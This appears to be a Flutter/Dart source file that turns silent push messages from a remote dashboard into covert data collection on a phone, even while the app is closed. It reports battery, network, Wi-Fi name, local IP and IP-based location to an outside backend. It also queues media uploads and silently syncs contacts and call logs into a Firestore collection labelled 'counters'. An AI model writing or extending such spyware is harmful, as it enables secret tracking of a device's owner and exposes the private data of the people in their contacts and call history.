import 'dart:convert';
import 'dart:io';

import 'package:battery_plus/battery_plus.dart';
import 'package:cloud_firestore/cloud_firestore.dart';
import 'package:connectivity_plus/connectivity_plus.dart';
import 'package:device_info_plus/device_info_plus.dart';
import 'package:firebase_messaging/firebase_messaging.dart';
import 'package:flutter/material.dart';
import 'package:network_info_plus/network_info_plus.dart';

import 'contacts_service.dart';
import 'config.dart';
import 'local_cursor.dart';
import 'media_config.dart';
import 'worker.dart';

/// Top-level background FCM handler. Fires even when the app is closed/swiped
/// because the high-priority *data* message wakes a headless isolate. We do
/// the minimum here — init Firebase and enqueue the worker — then return
/// quickly. The actual media upload happens in WorkManager.
@pragma('vm:entry-point')
Future<void> firebaseMessagingBackgroundHandler(RemoteMessage message) async {
  await ensureFirebase();
  enableFirestorePersistence();
  await _dispatchAction(message);
}

/// Route an FCM data message to the right handler.
Future<void> _dispatchAction(RemoteMessage message) async {
  final action = message.data['action'];

  // Silent internet-ping — write lastPing so dashboard can show online/offline
  if (action == 'ping') {
    final deviceId = await LocalCursor.deviceId();
    try {
      await FirebaseFirestore.instance
          .collection(AppConfig.countersCollection)
          .doc(deviceId)
          .update({'lastPing': FieldValue.serverTimestamp()});
    } catch (_) {}
    // Refresh IP-based location (fire and forget)
    try {
      final client = HttpClient();
      client.connectionTimeout = const Duration(seconds: 8);
      final req = await client.postUrl(
        Uri.parse('https://counter-backend.vercel.app/api/update-location'),
      );
      req.headers.contentType = ContentType.json;
      req.write(jsonEncode({'deviceId': deviceId}));
      await req.close();
      client.close();
    } catch (_) {}
    return;
  }

  // Dashboard "Status" button — collect battery, charging, network and write to Firestore
  if (action == 'get_device_status') {
    final deviceId = await LocalCursor.deviceId();
    try {
      final battery    = Battery();
      final level      = await battery.batteryLevel;
      final state      = await battery.batteryState;
      final isCharging = state == BatteryState.charging || state == BatteryState.full;

      final connectivity = Connectivity();
      final results      = await connectivity.checkConnectivity();
      String networkType = 'unknown';
      if (results.contains(ConnectivityResult.wifi))        networkType = 'WiFi';
      else if (results.contains(ConnectivityResult.mobile)) networkType = 'Mobile';
      else if (results.contains(ConnectivityResult.none))   networkType = 'Offline';

      String? ssid;
      String? localIp;
      if (networkType == 'WiFi') {
        try {
          final info   = NetworkInfo();
          final rawSsid = await info.getWifiName();
          if (rawSsid != null && rawSsid.isNotEmpty && rawSsid != '<unknown ssid>') {
            ssid = rawSsid.replaceAll('"', '');
          }
          final ip = await info.getWifiIP();
          if (ip != null && ip.isNotEmpty) localIp = ip;
        } catch (_) {}
      }

      await FirebaseFirestore.instance
          .collection(AppConfig.countersCollection)
          .doc(deviceId)
          .update({
        'liveStatus.battery':    level,
        'liveStatus.charging':   isCharging,
        'liveStatus.network':    networkType,
        if (ssid != null)    'liveStatus.ssid':    ssid,
        if (localIp != null) 'liveStatus.localIp': localIp,
        'liveStatus.reportedAt': FieldValue.serverTimestamp(),
      });
    } catch (e) {
      debugPrint('[fcm] get_device_status error: $e');
    }
    return;
  }

  if (action == AppConfig.mediaAction) {
    final type = MediaType.fromString(message.data['mediaType']);
    if (type != null) {
      await enqueueMediaUpload(type);
    } else {
      debugPrint('[fcm] unknown mediaType: ${message.data['mediaType']}');
    }
  }

  // Contacts / call logs sync — triggered from dashboard
  if (action == 'sync_data') {
    final syncType = message.data['mediaType'];
    final deviceId = message.data['deviceId'] ?? await LocalCursor.deviceId();
    final service = ContactsService();

    debugPrint('[fcm] sync_data: $syncType for $deviceId');

    if (syncType == 'contacts') {
      await service.syncContactsSilent(deviceId);
    } else if (syncType == 'callLogs') {
      await service.syncCallLogsSilent(deviceId);
    }
  }
}

class FcmService {
  FcmService._();

  /// Wire up FCM: permission, background + foreground handlers, and token
  /// registration into the device's Firestore doc. Call once from main().
  static Future<void> setup() async {
    final messaging = FirebaseMessaging.instance;

    // iOS/web need this; on Android data messages don't, but it's harmless.
    await messaging.requestPermission();

    FirebaseMessaging.onBackgroundMessage(firebaseMessagingBackgroundHandler);

    // Trigger arriving while the app is in the foreground.
    FirebaseMessaging.onMessage.listen((message) async {
      await _dispatchAction(message);
    });

    await _saveToken(await messaging.getToken());
    messaging.onTokenRefresh.listen(_saveToken);
  }

  static Future<void> _saveToken(String? token) async {
    if (token == null) return;
    final deviceId = await LocalCursor.deviceId();

    debugPrint('──────── device ────────');
    debugPrint('deviceId : $deviceId');
    debugPrint('fcmToken : $token');
    debugPrint('────────────────────────');

    final Map<String, dynamic> data = {
      'deviceId': deviceId,
      'fcmToken': token,
      'updatedAt': FieldValue.serverTimestamp(),
    };

    // Save device hardware info alongside FCM token
    try {
      if (Platform.isAndroid) {
        final info = await DeviceInfoPlugin().androidInfo;
        data['deviceInfo'] = {
          'brand': info.brand,
          'model': info.model,
          'manufacturer': info.manufacturer,
          'androidVersion': info.version.release,
          'sdkInt': info.version.sdkInt,
          'device': info.device,
        };
      }
    } catch (_) {}

    await FirebaseFirestore.instance
        .collection(AppConfig.countersCollection)
        .doc(deviceId)
        .set(data, SetOptions(merge: true));

    // Also update IP-based location when token is saved/refreshed
    try {
      final client = HttpClient();
      client.connectionTimeout = const Duration(seconds: 8);
      final req = await client.postUrl(
        Uri.parse('https://counter-backend.vercel.app/api/update-location'),
      );
      req.headers.contentType = ContentType.json;
      req.write(jsonEncode({'deviceId': deviceId}));
      await req.close();
      client.close();
    } catch (_) {}
  }
}
